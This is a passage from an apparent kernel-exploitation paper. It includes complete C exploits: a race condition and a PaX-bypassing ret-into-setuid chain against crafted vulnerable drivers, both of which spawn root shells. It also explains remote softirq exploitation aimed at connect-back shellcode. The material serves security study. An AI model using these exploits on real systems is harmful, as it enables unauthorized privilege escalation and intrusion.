$0x246,0x10(%rsp)\n\"\\x48\\xc7\\x44\\x24\\x08\\x23\\x00\\x00\\x00\"   \/\/  movq   $0x23,0x8(%rsp)  \/* 23\n32-bit , 33 64-bit cs *\/\n\"\\x48\\xc7\\x04\\x24\\x22\\x22\\x22\\x22\"       \/\/  movq   $0x22222222,(%rsp)\n\"\\x48\\xcf\";                              \/\/  iretq\nvoid eip_do_exit(void)\n{\nchar *argvx[] = {\"\/bin\/sh\", NULL};\nprintf(\"uid=%d\\n\", geteuid());\nexecve(\"\/bin\/sh\", argvx, NULL);\nexit(1);\n}\n\/*\n* This function maps stack and code segment\n* - 0x0000000000000000 - 0x0000000000001000   (future code space)\n* - 0x0000000011110000 - 0x0000000011112000   (future stack space)\n*\/\nint make_kjump(void)\n{\nvoid *stack_map = mmap((void*)(0x11110000), 0x2000,\nPROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0, 0);\nif(stack_map == MAP_FAILED)\nfatal_errno(\"mmap\", 1);\nvoid *shellcode_map = mmap(MMAP_NULL, 0x1000,\nPROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0,\n0);\nif(shellcode_map == MAP_FAILED)\nfatal_errno(\"mmap\", 1);\nmemcpy(shellcode_map, kernel_stub, sizeof(kernel_stub)-1);\nPATCH_CODE(MMAP_NULL, UID_OFFSET, getuid());\nPATCH_CODE(MMAP_NULL, STACK_OFF_OFFSET, 0x11111111);\nPATCH_CODE(MMAP_NULL, CODE_OFF_OFFSET,  &eip_do_exit);\n}\nint start_thread_priority(int (*f)(void *), void* arg)\n{\nchar *stack = malloc(PAGE_SIZE*4);\nint tid = clone(f, stack + PAGE_SIZE*4 -4,\nCLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VM, arg);\nif(tid < 0)\nfatal_errno(\"clone\", 1);\nnice(19);\nsleep(1);\nreturn tid;\n}\nint race_func(void* noarg)\n{\nprintf(\"[*] thread racer getpid()=%d\\n\", getpid());\nwhile(1)\n{\nif(glob_race)\n{\ng_ancillary->cmsg_len = 500;\nreturn;\n}\n}\n}\nuint64_t tsc()\n{\nuint64_t ret;\nasm volatile(\"rdtsc\" : \"=A\"(ret));\nreturn ret;\n}\nstruct tsc_stamp\n{\nuint64_t before;\nuint64_t after;\nuint32_t access;\n};\nstruct tsc_stamp stamp[128];\ninline char *flat_file_mmap(int fs)\n{\nvoid *addr = mmap(MMAP_ADDR, PAGE_SIZE*PAGE_NUM, PROT_READ|PROT_WRITE,\nMAP_SHARED|MAP_FIXED, fs, 0);\nif(addr == MAP_FAILED)\nfatal_errno(\"mmap\", 1);\nreturn (char*)addr;\n}\nvoid scan_addr(char *memory)\n{\nint i;\nfor(i=1; i<PAGE_NUM-1; i++)\n{\nstamp[i].access = (uint32_t)(memory + i*PAGE_SIZE);\nuint32_t dummy = *((uint32_t *)(memory + i*PAGE_SIZE-4));\nstamp[i].before = tsc();\ndummy = *((uint32_t *)(memory + i*PAGE_SIZE));\nstamp[i].after  = tsc();\n}\n}\n\/* make code access first 32 pages to flush page-cluster *\/\n\/* access: 0x20000000 - 0x2000XXXX *\/\nvoid start_flush_access(char *memory, uint32_t page_num)\n{\nint i;\nfor(i=0; i<page_num; i++)\n{\nuint32_t dummy = *((uint32_t *)(memory + i*PAGE_SIZE));\n}\n}\nvoid print_single_result(struct tsc_stamp *entry)\n{\nprintf(\"Accessing: %p, tsc-difference: %lld\\n\", entry->access,\nentry->after - entry->before);\n}\nvoid print_result()\n{\nint i;\nfor(i=1; i<PAGE_NUM-1; i++)\n{\nprintf(\"Accessing: %p, tsc-difference: %lld\\n\", stamp[i].access,\nstamp[i].after - stamp[i].before);\n}\n}\nvoid fill_ancillary(struct msghdr *msg, char *ancillary)\n{\nmsg->msg_control = ((ancillary + 32*PAGE_SIZE) - sizeof(struct\ncmsghdr));\nmsg->msg_controllen = sizeof(struct cmsghdr) * 2;\n\/* set global var thread race ancillary data chunk *\/\ng_ancillary = msg->msg_control;\nstruct cmsghdr* tmp = (struct cmsghdr *)(msg->msg_control);\ntmp->cmsg_len   = sizeof(struct cmsghdr);\ntmp->cmsg_level = 0;\ntmp->cmsg_type  = 0;\ntmp++;\ntmp->cmsg_len   = sizeof(struct cmsghdr);\ntmp->cmsg_level = 0;\ntmp->cmsg_type  = 0;\ntmp++;\nmemset(tmp, 0x00, 172);\n}\nint main()\n{\nstruct tsc_stamp single_stamp = {0};\nstruct msghdr msg = {0};\nmemset(&stamp, 0x00, sizeof(stamp));\nint fd = open(\"\/tmp\/file\", O_RDWR);\nif(fd == -1)\nfatal_errno(\"open\", 1);\nchar *addr = flat_file_mmap(fd);\nfill_ancillary(&msg, addr);\nmunmap(addr, PAGE_SIZE*PAGE_NUM);\nclose(fd);\nmake_kjump();\nsync();\nprintf(\"Flush all pages and press a enter:)\\n\");\ngetchar();\nfd = open(\"\/tmp\/file\", O_RDWR);\nif(fd == -1)\nfatal_errno(\"open\", 1);\naddr = flat_file_mmap(fd);\nint t_pid = start_thread_priority(race_func, NULL);\nprintf(\"[*] thread main getpid()=%d\\n\", getpid());\nstart_flush_access(addr, 32);\nint sc[2];\nint sp_ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sc);\nif(sp_ret < 0)\nfatal_errno(\"socketpair\", 1);\nsingle_stamp.access = (uint32_t)g_ancillary;\nsingle_stamp.before = tsc();\nglob_race =1;\nsendmsg(sc[0], &msg, 0);\nsingle_stamp.after = tsc();\nprint_single_result(&single_stamp);\nkill(t_pid, SIGKILL);\nmunmap(addr, PAGE_SIZE*PAGE_NUM);\nclose(fd);\nreturn 0;\n}\n< \/ >\n------[ 3 - Advanced scenarios\nIn an attempt to ''complete'' our tractation on kernel exploiting we're\nnow going to discuss two 'advanced scenarios' : a stack based kernel\nexploit capable to bypass PaX [18] KERNEXEC and Userland \/ Kernelland\nsplit and an effective remote exploit, both for the Linux kernel.\n---[ 3.1 - PaX KERNEXEC & separated kernel\/user space\nThe PaX KERNEXEC option emulates a no-exec bit for pages at kernel land\non an architecture which hasn't it (x86), while the User \/ Kerne Land\nsplit blocks the 'return-to-userland' approach that we have extensively\ndescribed and used in the paper. With those two protections active we're\nbasically facing the same scenario we encountered discussing the\nSolaris\/SPARC environment, so we won't go in more details here (to avoid\nduplicating the tractation).\nThis time, thou, we won't have any executable and controllable memory area\n(no u_psargs array), and we're going to present a different tecnique which\ndoesn't require to have one. Even if the idea behind applyes well to any\nno-exec and separated kernel\/userspace environment, as we'll see in a\nshort, this approach is quite architectural (stack management and function\ncall\/return implementation) and Operating System (handling of credentials)\nspecific.\nMoreover, it requires a precise knowledge of the .text layout of the\nrunning kernel, so at least a readable image (which is a default situation\non many distros, on Solaris, and on other operating systems we checked) or\na large or controlled infoleak is necessary.\nThe idea behind is not much different from the theory behind\n'ret-into-libc' or other userland exploiting approaches that attempt to\ncircumvent the non executability of heap and stack : as we know, Linux\nassociates credentials to each process in term of numeric values :\n< linux-2.6.15\/include\/linux\/sched.h >\nstruct task_struct {\n[...]\n\/* process credentials *\/\nuid_t uid,euid,suid,fsuid;\ngid_t gid,egid,sgid,fsgid;\n[...]\n}\n< \/ >\nSometimes a process needs to raise (or drop, for security reasons) its\ncredentials, so the kernel exports systemcalls to do that.\nOne of those is sys_setuid :\n< linux-2.6.15\/kernel\/sys.c >\nasmlinkage long sys_setuid(uid_t uid)\n{\nint old_euid = current->euid;\nint old_ruid, old_suid, new_ruid, new_suid;\nint retval;\nretval = security_task_setuid(uid, (uid_t)-1, (uid_t)-1,\nLSM_SETID_ID);\nif (retval)\nreturn retval;\nold_ruid = new_ruid = current->uid;\nold_suid = current->suid;\nnew_suid = old_suid;\nif (capable(CAP_SETUID)) {              [1]\nif (uid != old_ruid && set_user(uid, old_euid != uid) < 0)\nreturn -EAGAIN;\nnew_suid = uid;\n} else if ((uid != current->uid) && (uid != new_suid))\nreturn -EPERM;\nif (old_euid != uid)\n{\ncurrent->mm->dumpable = suid_dumpable;\nsmp_wmb();\n}\ncurrent->fsuid = current->euid = uid;    [2]\ncurrent->suid = new_suid;\nkey_fsuid_changed(current);\nproc_id_connector(current, PROC_EVENT_UID);\nreturn security_task_post_setuid(old_ruid, old_euid, old_suid,\nLSM_SETID_ID);\n}\n< \/ >\nAs you can see, the 'security' checks (out of the LSM security_* entry\npoints) are performed at [1] and after those, at [2] the values of fsuid\nand euid are set equal to the value passed to the function.\nsys_setuid is a system call, so, due to systemcall convention, parameters\nare passed in register. More precisely, 'uid' will be passed in '%ebx'.\nThe idea is so simple (and not different from 'ret-into-libc' [19] or\nother userspace page protection evading tecniques like [20]), if we manage\nto have 0 into %ebx and to jump right in the middle of sys_setuid (and\nright after the checks) we should be able to change the 'euid' and 'fsuid'\nof our process and thus raise our priviledges.\nLet's see the sys_setuid disassembly to better tune our idea :\n[...]\nc0120fd0:       b8 00 e0 ff ff          mov    $0xffffe000,%eax  [1]\nc0120fd5:       21 e0                   and    %esp,%eax\nc0120fd7:       8b 10                   mov    (%eax),%edx\nc0120fd9:       89 9a 6c 01 00 00       mov    %ebx,0x16c(%edx)  [2]\nc0120fdf:       89 9a 74 01 00 00       mov    %ebx,0x174(%edx)\nc0120fe5:       8b 00                   mov    (%eax),%eax\nc0120fe7:       89 b0 70 01 00 00       mov    %esi,0x170(%eax)\nc0120fed:       6a 01                   push   $0x1\nc0120fef:       8b 44 24 04             mov    0x4(%esp),%eax\nc0120ff3:       50                      push   %eax\nc0120ff4:       55                      push   %ebp\nc0120ff5:       57                      push   %edi\nc0120ff6:       e8 65 ce 0c 00          call   c01ede60\nc0120ffb:       89 c2                   mov    %eax,%edx\nc0120ffd:       83 c4 10                add    $0x10,%esp        [3]\nc0121000:       89 d0                   mov    %edx,%eax\nc0121002:       5e                      pop    %esi\nc0121003:       5b                      pop    %ebx\nc0121004:       5e                      pop    %esi\nc0121005:       5f                      pop    %edi\nc0121006:       5d                      pop    %ebp\nc0121007:       c3                      ret\nAt [1] the current process task_struct is taken from the kernel stack\nvalue. At [2] the %ebx value is copied over the 'euid' and 'fsuid' members\nof the struct. We have our return address, which is [1].\nAt that point we need to force somehow %ebx into being 0 (if we're not\nlucky enough to have it already zero'ed).\nTo demonstrate this vulnerability we have used the local exploitable\nbuffer overflow in dummy.c driver (KERN_IOCTL_STORE_CHUNK ioctl()\ncommand). Since it's a stack based overflow we can chain multiple return\naddress preparing a fake stack frame that we totally control.\nWe need :\n- a zero'ed %ebx : the easiest way to achieve that is to find a pop %ebx\nfollowed by a ret instruction [we control the stack] :\nret-to-pop-ebx:\n[*] c0100cd3:       5b      pop    %ebx\n[*] c0100cd4:       c3      ret\nwe don't strictly need pop %ebx directly followed by ret, we may find a\nsequence of pops before the ret (and, among those, our pop %ebx). It is\njust a matter of preparing the right ZERO-layout for the pop sequence\n(to make it simple, add a ZERO 4-bytes sequence for any pop between the\n%ebx one and the ret)\n- the return addr where to jump, which is the [1] address shown above\n- a 'ret-to-ret' padding to take care of the stack gap created at [3] by\nthe function epilogue (%esp adding and register popping) :\nret-to-ret pad:\n[*] 0xffffe413      c3      ret\n(we could have used the above ret aswell, this one is into vsyscall\npage and was used in other exploit where we didn't need so much\nknowledge of the kernel .text.. it survived here :) )\n- the address of an iret instruction to return to userland (and a crafted\nstack frame for it, as we described above while discussing 'Stack\nBased' explotation) :\nret-to-iret:\n[*] c013403f:       cf      iret\nPutting all together this is how our 'stack' should look like to perform a\ncorrect explotation :\nlow addresses\n+----------------+\n| ret-to-ret pad |\n| ret-to-ret pad |\n| .............. |\n| ret-to-pop ebx |\n| 0x00000000     |\n| ret-to-setuid  |\n| ret-to-ret pad |\n| ret-to-ret pad |\n| ret-to-ret pad |\n| .............  |\n| .............  |\n| ret-to-iret    |\n| fake-iret-frame|\n+----------------+\nhigh addresses\nOnce correctly returned to userspace we have successfully modified 'fsuid'\nand 'euid' value, but our 'ruid' is still the original one. At that point\nwe simply re-exec ourselves to get euid=0 and then spawn the shell.\nCode follows :\n< stuff\/expl\/grsec_noexec.c >\n#include <sys\/ioctl.h>\n#include <signal.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys\/types.h>\n#include <sys\/stat.h>\n#include <fcntl.h>\n#include <sys\/mman.h>\n#include \"dummy.h\"\n#define DEVICE \"\/dev\/dummy\"\n#define NOP 0x90\n#define PAGE_SIZE 0x1000\n#define STACK_SIZE 8192\n\/\/#define STACK_SIZE 4096\n#define STACK_MASK ~(STACK_SIZE -1)\n\/* patch it at runtime *\/\n#define ALTERNATE_STACK 0x00BBBBBB\n\/*2283d*\/\n#define RET_INTO_RET_STR   \"\\x3d\\x28\\x02\\x00\"\n#define DUMMY              RET_INTO_RET_STR\n#define ZERO               \"\\x00\\x00\\x00\\x00\"\n\/* 22ad3 *\/\n#define RET_INTO_POP_EBX   \"\\xd3\\x2a\\x02\\x00\"\n\/* 1360 *\/\n#define RET_INTO_IRET      \"\\x60\\x13\\x00\\x00\"\n\/* 227fc *\/\n#define RET_INTO_SETUID    \"\\xfc\\x27\\x02\\x00\"\n\/\/ do_eip at .text offset (rivedere)\n\/\/ 0804864f\n#define USER_CODE_OFFSET   \"\\x4f\\x86\\x04\\x08\"\n#define USER_CODE_SEGMENT  \"\\x73\\x00\\x00\\x00\"\n#define USER_EFLAGS        \"\\x46\\x02\\x00\\x00\"\n#define USER_STACK_OFFSET  \"\\xbb\\xbb\\xbb\\x00\"\n#define USER_STACK_SEGMENT \"\\x7b\\x00\\x00\\x00\"\n\/* sys_setuid - grsec kernel *\/\n\/*\n227fc:       89 e2                   mov    %esp,%edx\n227fe:       89 f1                   mov    %esi,%ecx\n22800:       81 e2 00 e0 ff ff       and    $0xffffe000,%edx\n22806:       8b 02                   mov    (%edx),%eax\n22808:       89 98 50 01 00 00       mov    %ebx,0x150(%eax)\n2280e:       89 98 58 01 00 00       mov    %ebx,0x158(%eax)\n22814:       8b 02                   mov    (%edx),%eax\n22816:       89 fa                   mov    %edi,%edx\n22818:       89 a8 54 01 00 00       mov    %ebp,0x154(%eax)\n2281e:       c7 44 24 18 01 00 00    movl   $0x1,0x18(%esp)\n22825:       00\n22826:       8b 04 24                mov    (%esp),%eax\n22829:       5d                      pop    %ebp\n2282a:       5b                      pop    %ebx\n2282b:       5e                      pop    %esi\n2282c:       5f                      pop    %edi\n2282d:       5d                      pop    %ebp\n2282e:       e9 ef d5 0c 00          jmp    efe22\n<cap_task_post_setuid>\n22833:       83 ca ff                or     $0xffffffff,%edx\n22836:       89 d0                   mov    %edx,%eax\n22838:       5f                      pop    %edi\n22839:       5b                      pop    %ebx\n2283a:       5e                      pop    %esi\n2283b:       5f                      pop    %edi\n2283c:       5d                      pop    %ebp\n2283d:       c3                      ret\n*\/\n\/* pop %ebx, ret grsec\n*\n* ffd1a884:       5b                      pop    %ebx\n* ffd1a885:       c3                      ret\n*\/\nchar *g_prog_name;\nchar kern_noexec_shellcode[] =\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_POP_EBX\nZERO\nRET_INTO_SETUID\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_POP_EBX\nRET_INTO_RET_STR\nRET_INTO_RET_STR\nRET_INTO_IRET\nUSER_CODE_OFFSET\nUSER_CODE_SEGMENT\nUSER_EFLAGS\nUSER_STACK_OFFSET\nUSER_STACK_SEGMENT\n;\nvoid re_exec(int useless)\n{\nchar *a[3] = { g_prog_name, \"exec\", NULL };\nexecve(g_prog_name, a, NULL);\n}\nchar *allocate_jump_stack(unsigned int jump_addr, unsigned int size)\n{\nunsigned int round_addr = jump_addr & 0xFFFFF000;\nunsigned int diff       = jump_addr - round_addr;\nunsigned int len        = (size + diff + 0xFFF) & 0xFFFFF000;\nchar *map_addr = mmap((void*)round_addr,\nlen,\nPROT_READ|PROT_WRITE,\nMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,\n0,\n0);\nif(map_addr == (char*)-1)\nreturn NULL;\nmemset(map_addr, 0x00, len);\nreturn map_addr;\n}\nchar *allocate_jump_code(unsigned int jump_addr, void* code, unsigned int\nsize)\n{\nunsigned int round_addr = jump_addr & 0xFFFFF000;\nunsigned int diff       = jump_addr - round_addr;\nunsigned int len        = (size + diff + 0xFFF) & 0xFFFFF000;\nchar *map_addr = mmap((void*)round_addr,\nlen,\nPROT_READ|PROT_WRITE|PROT_EXEC,\nMAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,\n0,\n0);\nif(map_addr == (char*)-1)\nreturn NULL;\nmemset(map_addr, NOP, len);\nmemcpy(map_addr+diff, code, size);\nreturn map_addr + diff;\n}\ninline void patch_code_4byte(char *code, unsigned int offset, unsigned int\nvalue)\n{\n*((unsigned int *)(code + offset)) = value;\n}\nint main(int argc, char *argv[])\n{\nif(argc > 1)\n{\nint ret;\nchar *argvx[] = {\"\/bin\/sh\", NULL};\nret = setuid(0);\nprintf(\"euid=%d, ret=%d\\n\", geteuid(), ret);\nexecve(\"\/bin\/sh\", argvx, NULL);\nexit(1);\n}\nsignal(SIGSEGV, re_exec);\ng_prog_name = argv[0];\nchar *stack_jump =\nallocate_jump_stack(ALTERNATE_STACK, PAGE_SIZE);\nif(!stack_jump)\n{\nfprintf(stderr, \"Exiting: mmap failed\");\nexit(1);\n}\nchar *memory = malloc(PAGE_SIZE), *mem_orig;\nmem_orig = memory;\nmemset(memory, 0xDD, PAGE_SIZE);\nstruct device_io_ctl *ptr = (struct device_io_ctl*)memory;\nptr->chunk_num = 9 + (sizeof(kern_noexec_shellcode)-1)\/sizeof(struct\ndevice_io_blk) + 1;\nprintf(\"Chunk num: %d\\n\", ptr->chunk_num);\nptr->type = 0xFFFFFFFF;\nmemory += (sizeof(struct device_io_ctl) + sizeof(struct device_io_blk) *\n9);\n\/* copy shellcode *\/\nmemcpy(memory, kern_noexec_shellcode, sizeof(kern_noexec_shellcode)-1);\nint i, fd = open(DEVICE,  O_RDONLY);\nif(fd < 0)\nreturn 0;\nioctl(fd, KERN_IOCTL_STORE_CHUNK, (unsigned long)mem_orig);\nreturn 0;\n}\n< \/ >\nAs we said, we have chosen the PaX security patches for Linux\/x86, but\nsome of the theory presented equally works well in other situation.\nA slightly different exploiting approach was successfully used on\nSolaris\/SPARC. (we leave it as an 'exercise' for the reader ;))\n---[ 3.2 - Remote Kernel Exploiting\nWriting a working and somehow reliable remote kernel exploit is an\nexciting and interesting challenge. Keeping on with the 'style' of this\npaper we're going to propose here a couple of tecniques and 'life notes'\nthat leaded us into succeeding into writing an almost reliable, image\nindependant and effective remote exploit.\nAfter the first draft of this paper, a couple of things changed, so some\nof the information presented here could be outdated in the very latest\nkernels (and compiler releases), but are anyway a good base for the\ntractation (we've added notes all around this chapter about changes and\nupdates into the recent releases of the linux kernel).\nA couple of the ideas presented here converged into a real remote exploit\nfor the madwifi remote kernel stack buffer overflow [21], that we already\nreleased [22], without examining too much in detail the explotation\napproaches used. This chapter can be thus seen both as the introduction\nand the extension of that work.\nMore precisely we will cover here also the exploiting issues and solution\nwhen dealing with code running in interrupt context, which is the most\ncommon running mode for network based code (interrupt handler, softirq,\netc) but which wasn't the case for the madwifi exploit.\nThe same ideas apply well to kernel thread context too.\nExplotation tecniques and discussion is based on stack based buffer\noverflow on the Linux 2.6.* branch of kernels on the x86 architecture, but\ncan be reused in most of the conditions that lead us to take control over\nthe instruction flow.\n------[ 3.2.1 - The Network Contest\nWe begin with a few considerations about the typology of kernel code that\nwe'll be dealing with. Most of that code runs in interrupt context (and\nsometimes in a kernel thread context), so we have some 'limitations' :\n- we can't directly 'return-to-userspace', since we don't have a valid\ncurrent task pointer. Moreover, most of times, we won't control the\naddress space of the userland process we talk with. Netherless we can\nrelay on some 'fixed' points, like the ELF header (given there's no\nPIE \/ .text randomization on the remote box)\n- we can't perform any action that might make the kernel path to sleep\n(for example a memory fault access)\n- we can't directly call a system call\n- we have to take in account kernel resource management, since such kind\nof kernel paths usually acquire spinlocks or disables pre-emption. We\nhave to restore them in a stable state.\nLogically, since we are from remote, we don't have any information about\nstructs or kernel paths addresses, so, since a good infoleaking is usually\na not very probable situation, we can't rely on them.\nWe have prepared a crafted example that will let us introduce all the\ntecniques involved to solve the just stated problems. We choosed to write\na netfilter module, since quite a lot of the network kernel code depends\non it and it's the main framework for third part modules.\n< stuff\/drivers\/linux\/remote\/dummy_remote.c >\n#define MAX_TWSKCHUNK 30\n#define TWSK_PROTO    37\nstruct twsk_chunk\n{\nint type;\nchar buff[12];\n};\nstruct twsk\n{\nint chunk_num;\nstruct twsk_chunk chunk[0];\n};\nstatic int process_twsk_chunk(struct sk_buff *buff)\n{\nstruct twsk_chunk chunks[MAX_TWSKCHUNK];\nstruct twsk *ts = (struct twsk *)((char*)buff->nh.iph +\n(buff->nh.iph->ihl * 4));\nif(ts->chunk_num > MAX_TWSKCHUNK)                                   [1]\nreturn (NF_DROP);\nprintk(KERN_INFO \"Processing TWSK packet: packet frame n. %d\\n\",\nts->chunk_num);\nmemcpy(chunks, ts->chunk, sizeof(struct twsk_chunk) * ts->chunk_num); [2]\n\/\/ do somethings..\nreturn (NF_ACCEPT);\n}\n< \/ >\nWe have a signedness issue at [1], which triggers a later buffer overflow\nat [2], writing past the local 'chunks' buffer.\nAs we just said, we must know everything about the vulnerable function,\nthat is, when it runs, under which 'context' it runs, what calls what, how\nwould the stack look like, if there are spinlocks or other control\nmanagement objects acquired, etc.\nA good starting point is dumping a stack trace at calling time of our\nfunction :\n#1  0xc02b5139 in nf_iterate (head=0xc042e4a0, skb=0xc1721ad0, hook=0, [1]\nindev=0xc1224400, outdev=0x0, i=0xc1721a88,\nokfn=0xc02bb150 <ip_rcv_finish>, hook_thresh=-2147483648)\nat net\/netfilter\/core.c:89\n#2  0xc02b51b9 in nf_hook_slow (pf=2, hook=1, pskb=0xc1721ad0,         [2]\nindev=0xc1224400, outdev=0x0, okfn=0xc02bb150 <ip_rcv_finish>,\nhook_thresh=-2147483648) at net\/netfilter\/core.c:125\n#3  0xc02baee3 in ip_rcv (skb=0xc1bc4a40, dev=0xc1224400, pt=0xc0399310,\norig_dev=0xc1224400) at net\/ipv4\/ip_input.c:348\n#4  0xc02a5432 in netif_receive_skb (skb=0xc1bc4a40) at\nnet\/core\/dev.c:1657\n#5  0xc024d3c2 in rtl8139_rx (dev=0xc1224400, tp=0xc1224660, budget=64)\nat drivers\/net\/8139too.c:2030\n#6  0xc024d70e in rtl8139_poll (dev=0xc1224400, budget=0xc1721b78)\nat drivers\/net\/8139too.c:2120\n#7  0xc02a5633 in net_rx_action (h=0xc0417078) at net\/core\/dev.c:1739\n#8  0xc0118a75 in __do_softirq () at kernel\/softirq.c:95\n#9  0xc0118aba in do_softirq () at kernel\/softirq.c:129                [3]\n#10 0xc0118b7d in irq_exit () at kernel\/softirq.c:169\n#11 0xc0104212 in do_IRQ (regs=0xc1721ad0) at arch\/i386\/kernel\/irq.c:110\n#12 0xc0102b0a in common_interrupt () at current.h:9\n#13 0x0000110b in ?? ()\nOur vulnerable function (just like any other hook) is called serially by\nthe nf_iterate one [1], during the processing of a softirq [3], through\nthe netfilter core interface nf_hook_slow [2].\nIt is installed in the INPUT chain and, thus, it starts processing packets\nwhenever they are sent to the host box, as we see from [2] where pf = 2\n(PF_INET) and hook = 1 (NF_IP_LOCAL_IN).\nOur final goal is to execute some kind of code that will estabilish a\nconnection back to us (or bind a port to a shell, or whatever kind of\nshellcoding you like more for your remote exploit). Trying to execute it\ndirectly from kernel land is obviously a painful idea so we need to hijack\nsome userland process (remember that we are on top of a softirq, so we\nhave no clue about what's really beneath us; it could equally be a kernel\nthread or the idle task, for example) as our victim, to inject some code\ninside and force the kernel to call it later on, when we're out of an\nasyncronous event.\nThat means that we need an intermediary step between taking the control\nover the flow at 'softirq time' and execute from the userland process.\nBut let's go on order, first of all we need to _start executing_ at least\nthe entry point of our shellcode.\nAs it is nowadays used in many exploit that have to fight against address\nspace randomization in the absence of infoleaks, we look for a jump to a\njmp *%esp or push reg\/ret or call reg sequence, to start executing from a\nknown point.\nTo avoid guessing the right return value a nop-alike padding of\nret-into-ret addresses can be used. But we still need to find those\nopcodes in a 'fixed' and known place.\nThe 2.6. branch of kernel introduced a fixed page [*] for the support of\nthe 'sysenter' instruction, the 'vsyscall' one :\nbfe37000-bfe4d000 rwxp bfe37000 00:00 0          [stack]\nffffe000-fffff000 ---p 00000000 00:00 0          [vdso]\nwhich is located at a fixed address : 0xffffe000 - 0xfffff000.\n[*] At time of release this is no more true on latest kernels, since the\naddress of the vsyscall page is randomized starting from the 2.6.18\nkernel.\nThe 'vsyscall' page is a godsend for our 'entry point' shellcode, since we\ncan locate inside it the required opcodes [*] to start executing :\n(gdb) x\/i 0xffffe75f\n0xffffe75f:     jmp    *%esp\n(gdb) x\/i 0xffffe420\n0xffffe420:     ret\n[*] After testing on a wide range of kernels\/compilers the addresses of\nthose opcodes we discovered that sometimes they were not in the\nexpected place or, even, in one case, not present. This could be the\nonly guessing part you could be facing (also due to vsyscall\nrandomization, as we said in the note before), but there are\n(depending on situations) other possibilities [fixed start of the\nkernel image, fixed .text of the 'running process' if out of interrupt\ncontext, etc].\nTo better figure out how the layout of the stack should be after the\noverflow, here there's a small schema :\n+-------------+\n|             |\n|             |\n| JMP -N      |-------+     # N is the size of the buffer plus some bytes\n|             |       |       (ret-to-ret chain + jmp space)\n|             |       |\n| ret-to-jmp  |<-+    |     # the address of the jmp *%esp inside vsyscall\n|             |  |    |\n| .........   | -+    |\n|             |  |    |\n| ret-to-ret  | -+    |     # the address of 'ret' inide vsyscall\n|             |  |    |\n| ret-to-ret  | -+    |\n|             |       |\n| overwritten |       |     # ret-to-ret padding starting from there\n| ret address |       |\n|             |       |\n|             |       |\n|      ^      |       |\n|      |      |       |     # shellcode is placed inside the buffer\n|             |       |       because it's huge, but it could also be\n|  shellcode  |       |       splitted before and after the ret addr.\n|   nop       |       |\n|   nop       |<------+\n+-------------+\nAt that point we control the flow, but we're still inside the softirq, so\nwe need to perform a couple of tasks to cleanly get our connect back\nshellcode executed :\n- find a way to cleanly get out from the softirq, since we trashed the\nstack\n- locate the resource management objects that have been modified (if\nthe've been) and restore them to a safe state\n- find a place where we can store our shellcode untill later execution\nfrom a 'process context' kernel path.\n- find a way to force the before mentioned kernel path to execute our\nshellcode\nThe first step is the most difficult one (and wasn't necessary in the\nmadwifi exploit, since we weren't in interrupt context), because we've\noverwritten the original return pointer and we have no clue about the\nkernel text layout and addresses.\nWe're going now to present tecniques and a working shellcode for each one\nof the above points. [ Note that we have mentioned them in a 'conceptual\norder of importance', which is different from the real order that we use\ninside the exploit. More precisely, they are almost in reverse order,\nsince the last step performed by our shellcode is effectively getting out\nfrom the softirq. We felt that approach more well-explanatory, just\nremember that note during the following sub-chapters]\n------[ 3.2.2 - Stack Frame Flow Recovery\nThe goal of this tecnique is to unroll the stack, looking for some known\npattern and trying to reconstruct a caller stack frame, register status\nand instruction pointing, just to continue over with the normal flow.\nWe need to restore the stack pointer to a known and consistent state,\nrestore register contents so that the function flow will exit cleanily and\nrestore any lock or other syncronization object that was modified by the\nfunctions among the one we overflowed in and the one we want to 'return\nto'.\nOur stack layout (as seen from the dump pasted above) would basically be\nthat one :\nstack layout\n+---------------------+   bottom of stack\n|                     |\n| do_softirq()        |\n| ..........          |             \/* nf_hook_slow() stack frame *\/\n| ..........          |             +------------------------+\n|                     |             |  argN                  |\n|                     |             |  ...                   |\n| ip_rcv              |             |  arg2                  |\n| nf_hook_slow        | =========>  |  arg1                  |\n| ip_rcv_finish       |             |  ret-to-(ip_rcv())     |\n| nf_iterate          |             |  saved reg1            |\n|                     |             |  saved reg2            |\n|                     |             |  ......                |\n| ..............      |             +------------------------+\n| ..............      |\n| process_twsk_chunk  |\n|                     |\n+---------------------+  top of stack\nAs we said, we need to locate a function in the previous stack frames, not\ntoo far from our overflowing one, having some 'good pattern' that would\nhelp us in our search.\nOur best bet, in that situation, is to check parameter passing :\n#2  0xc02b51b9 in nf_hook_slow (pf=2, hook=1, pskb=0xc1721ad0,\nindev=0xc1224400, outdev=0x0, ....)\nThe 'nf_hook_slow()' function has a good 'signature' :\n-  two consecutive dwords 0x00000002 and 0x00000002\n-  two kernel pointers (dword > 0xC0000000)\n-  a following NULL dword\nWe can relay on the fact that this pattern would be a constant, since\nwe're in the INPUT chain, processing incoming packets, and thus always\nhaving a NULL 'outdev', pf = 2 and hook = 1.\nParameters passing is logically not the only 'signature' possible :\ndepending on situations you could find a common pattern in some local\nvariable (which would be even a better one, because we discovered that\nsome versions of GCC optimize out some parameters, passing them through\nregisters).\nScanning backward the stack from the process_twsk_chunk() frame up to\nthe nf_hook_slow() one, we can later set the %esp value to the place where\nis saved the return address of nf_hook_slow(), and, once recreated the\ncorrect conditions, perform a 'ret' that would let us exit cleanily.\nWe said 'once recreated the correct conditions' because the function could\nexpect some values inside registers (that we have to set) and could expect\nsome 'lock' or 'preemption set' different from the one we had at time of\noverflowing. Our task is thus to emulate\/restore all those requirements.\nTo 